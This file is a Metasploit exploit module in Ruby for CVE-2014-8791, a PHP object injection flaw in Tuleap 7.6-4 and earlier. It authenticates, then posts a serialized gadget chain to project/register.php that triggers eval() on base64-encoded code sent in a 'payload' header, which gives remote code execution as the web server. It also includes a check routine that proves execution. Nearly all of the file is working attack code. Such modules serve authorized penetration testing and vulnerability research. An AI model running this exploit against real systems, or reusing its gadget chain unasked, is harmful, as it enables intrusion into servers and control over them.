# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Tuleap PHP Unserialize Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a PHP object injection vulnerability in Tuelap <= 7.6-4 which could be
        abused to allow authenticated users to execute arbitrary code with the permissions of the
        web server. The dangerous unserialize() call exists in the &#039;src/www/project/register.php&#039;
        file. The exploit abuses the destructor method from the Jabbex class in order to reach a
        call_user_func_array() call in the Jabbex class and call the fetchPostActions() method from
        the Transition_PostAction_FieldFactory class to execute PHP code through an eval() call. In
        order to work, the target must have the &#039;sys_create_project_in_one_step&#039; option disabled.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => &#039;EgiX&#039;,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-8791&#039;],
          [&#039;OSVDB&#039;, &#039;115128&#039;],
          [&#039;URL&#039;, &#039;http://karmainsecurity.com/KIS-2014-13&#039;],
          [&#039;URL&#039;, &#039;https://tuleap.net/plugins/tracker/?aid=7601&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Generic (PHP Payload)&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Nov 27 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "The base path to the web application", "/"]),
        OptString.new(&#039;USERNAME&#039;, [true, "The username to authenticate with" ]),
        OptString.new(&#039;PASSWORD&#039;, [true, "The password to authenticate with" ]),
        OptBool.new(&#039;SSL&#039;, [true, "Negotiate SSL for outgoing connections", true]),
        Opt::RPORT(443)
      ], self.class)
  end

  def check
    flag = rand_text_alpha(rand(10)+20)
    res = exec_php("print #{flag};")

    if res and res.body and res.body.to_s =~ /#{flag}/
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def do_login()
    print_status("#{peer} - Logging in...")

    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]

    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;account/login.php&#039;),
      &#039;vars_post&#039; => {&#039;form_loginname&#039; => username, &#039;form_pw&#039; => password}
    })

    unless res && res.code == 302
      fail_with(Failure::NoAccess, "#{peer} - Login failed with #{username}:#{password}")
    end

    print_status("#{peer} - Login successful with #{username}:#{password}")
    res.get_cookies
  end

  def exec_php(php_code)
    session_cookies = do_login()

    chain =  &#039;O:6:"Jabbex":2:{S:15:"\00Jabbex\00handler";O:12:"EventHandler":1:{S:27:"\00EventHandler\00authenticated";b:1;}&#039;
    chain << &#039;S:11:"\00Jabbex\00jab";O:6:"Jabber":3:{S:8:"_use_log";i:1;S:11:"_connection";O:5:"Chart":0:{}S:15:"_event_handlers";&#039;
    chain << &#039;a:1:{S:9:"debug_log";a:2:{i:0;O:34:"Transition_PostAction_FieldFactory":1:{S:23:"\00*\00post_actions_classes";&#039;
    chain << &#039;a:1:{i:0;S:52:"1;eval(base64_decode($_SERVER[HTTP_PAYLOAD]));die;//";}}i:1;S:16:"fetchPostActions";}}}}&#039;

    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;project/register.php&#039;),
      &#039;cookie&#039;    => session_cookies,
      &#039;vars_post&#039; => {&#039;data&#039; => chain},
      &#039;headers&#039;   => {&#039;payload&#039; => Rex::Text.encode_base64(php_code)}
    }, 3)
  end

  def exploit
    print_status("#{peer} - Exploiting the PHP object injection...")
    exec_php(payload.encoded)
  end
end

